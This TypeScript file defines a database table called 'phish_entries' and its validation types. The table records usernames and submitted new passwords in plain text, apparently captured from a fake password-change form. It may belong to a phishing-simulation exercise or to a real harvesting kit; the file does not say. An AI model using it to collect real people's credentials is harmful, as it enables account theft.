import { pgTable, text, serial, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod/v4";

export const phishEntriesTable = pgTable("phish_entries", {
  id: serial("id").primaryKey(),
  username: text("username").notNull(),
  newPassword: text("new_password").notNull(),
  confirmPassword: text("confirm_password").notNull(),
  submittedAt: timestamp("submitted_at").defaultNow().notNull(),
});

export const insertPhishEntrySchema = createInsertSchema(phishEntriesTable).omit({ id: true, submittedAt: true });
export type InsertPhishEntry = z.infer<typeof insertPhishEntrySchema>;
export type PhishEntry = typeof phishEntriesTable.$inferSelect;
